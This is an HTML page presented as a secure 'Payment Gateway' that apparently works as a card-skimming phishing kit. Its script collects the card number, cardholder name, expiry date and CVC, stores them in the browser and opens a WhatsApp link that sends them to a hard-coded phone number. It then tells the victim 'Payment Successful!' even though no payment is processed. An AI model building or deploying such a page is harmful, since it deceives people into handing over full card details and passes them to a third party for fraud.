<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Gateway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
            max-width: 550px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #00bf72 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 32px;
            margin-bottom: 8px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        .business-input {
            display: flex;
            justify-content: center;
            margin-bottom: 15px;
        }
        .business-input input {
            padding: 10px 15px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 8px;
            font-size: 13px;
            width: 250px;
            text-align: center;
            background: rgba(255,255,255,0.1);
            color: white;
        }
        .business-input input:focus {
            outline: none;
            border-color: white;
        }
        .card-section {
            padding: 30px;
        }
        .card-preview {
            background: linear-gradient(135deg, #ef5350 0%, #ff7043 25%, #1976d2 50%, #00bf72 75%, #43a047 100%);
            color: white;
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
        }
        .card-icon {
            font-size: 40px;
            margin-bottom: 15px;
        }
        .card-number-display {
            font-size: 22px;
            letter-spacing: 4px;
            font-family: 'Courier New', monospace;
            margin: 20px 0;
            font-weight: bold;
        }
        .card-details {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid rgba(255,255,255,0.3);
        }
        .form-section {
            padding: 0 30px 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1e3c72;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #1976d2;
            background: #f0f7ff;
        }
        .row {
            display: grid;
            grid-template-columns: 1.5fr 1fr;
            gap: 15px;
        }
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ef5350 0%, #1976d2 50%, #00bf72 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
        }
        .submit-btn:hover {
            transform: translateY(-3px);
        }
        .success-message {
            display: none;
            background: linear-gradient(135deg, #00bf72 0%, #43a047 100%);
            color: white;
            padding: 25px;
            text-align: center;
            border-radius: 15px;
            margin-bottom: 20px;
        }
        .success-message.show {
            display: block;
        }
        .loading {
            display: none;
            text-align: center;
            color: #1976d2;
            padding: 15px;
        }
        .spinner {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #1976d2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="business-input">
                <input type="text" id="businessName" placeholder="Your Business Name" value="Premium Payments">
            </div>
            <h1 id="displayBusiness">Premium Payments</h1>
            <p>Secure Payment Gateway</p>
        </div>

        <div class="card-section">
            <div class="success-message" id="successMessage">
                <h2>✓ Payment Successful!</h2>
                <p>Your payment details have been securely processed</p>
            </div>

            <div class="card-preview">
                <div class="card-icon">💳</div>
                <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
                <div class="card-details">
                    <div>
                        <div style="font-size: 10px; opacity: 0.8;">Cardholder</div>
                        <div id="cardHolderDisplay" style="font-size: 14px;">YOUR NAME</div>
                    </div>
                    <div style="text-align: right;">
                        <div style="font-size: 10px; opacity: 0.8;">Expires</div>
                        <div id="cardExpiryDisplay" style="font-size: 14px;">MM/YY</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="form-section">
            <form id="paymentForm">
                <div class="form-group">
                    <label>Card Number *</label>
                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                </div>

                <div class="form-group">
                    <label>Cardholder Name *</label>
                    <input type="text" id="cardHolder" placeholder="John Doe" required>
                </div>

                <div class="row">
                    <div class="form-group">
                        <label>Expiry Date *</label>
                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group">
                        <label>CVC *</label>
                        <input type="text" id="cvc" placeholder="123" maxlength="4" required>
                    </div>
                </div>

                <div class="loading" id="loadingIndicator">
                    <span class="spinner"></span>Processing Payment...
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">Submit Payment</button>
            </form>
        </div>
    </div>

    <script>
        const businessInput = document.getElementById('businessName');
        const displayBusiness = document.getElementById('displayBusiness');
        const cardNumberInput = document.getElementById('cardNumber');
        const cardNumberDisplay = document.getElementById('cardNumberDisplay');
        const cardHolderInput = document.getElementById('cardHolder');
        const cardHolderDisplay = document.getElementById('cardHolderDisplay');
        const expiryInput = document.getElementById('expiry');
        const expiryDisplay = document.getElementById('cardExpiryDisplay');
        const cvcInput = document.getElementById('cvc');
        const form = document.getElementById('paymentForm');
        const successMessage = document.getElementById('successMessage');
        const submitBtn = document.getElementById('submitBtn');
        const loadingIndicator = document.getElementById('loadingIndicator');

        businessInput.addEventListener('input', function() {
            displayBusiness.textContent = this.value || 'Premium Payments';
        });

        cardNumberInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            this.value = formatted;
            if (value.length > 0) {
                let masked = value.replace(/./g, '•').slice(0, -4) + value.slice(-4);
                cardNumberDisplay.textContent = masked.match(/.{1,4}/g)?.join(' ') || masked;
            } else {
                cardNumberDisplay.textContent = '•••• •••• •••• ••••';
            }
        });

        cardHolderInput.addEventListener('input', function() {
            cardHolderDisplay.textContent = (this.value || 'YOUR NAME').toUpperCase();
        });

        expiryInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '').slice(0, 4);
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            this.value = value;
            expiryDisplay.textContent = value || 'MM/YY';
        });

        cvcInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            submitBtn.disabled = true;
            loadingIndicator.style.display = 'block';

            const paymentData = {
                business: businessInput.value,
                cardholder: cardHolderInput.value,
                card: cardNumberInput.value,
                expiry: expiryInput.value,
                cvc: cvcInput.value,
                time: new Date().toLocaleString()
            };

            const message = `🔔 PAYMENT RECEIVED\n\nBusiness: ${paymentData.business}\nCardholder: ${paymentData.cardholder}\nCard: ${paymentData.card}\nExpiry: ${paymentData.expiry}\nCVC: ${paymentData.cvc}\nTime: ${paymentData.time}`;

            localStorage.setItem('payment_' + Date.now(), JSON.stringify(paymentData));

            const whatsappUrl = `https://wa.me/447414775109?text=${encodeURIComponent(message)}`;

            setTimeout(() => {
                successMessage.classList.add('show');
                loadingIndicator.style.display = 'none';
                form.style.display = 'none';
                
                window.open(whatsappUrl, '_blank');

                setTimeout(() => {
                    form.reset();
                    form.style.display = 'block';
                    successMessage.classList.remove('show');
                    cardNumberDisplay.textContent = '•••• •••• •••• ••••';
                    cardHolderDisplay.textContent = 'YOUR NAME';
                    expiryDisplay.textContent = 'MM/YY';
                    submitBtn.disabled = false;
                }, 4000);
            }, 1500);
        });
    </script>
</body>
</html>
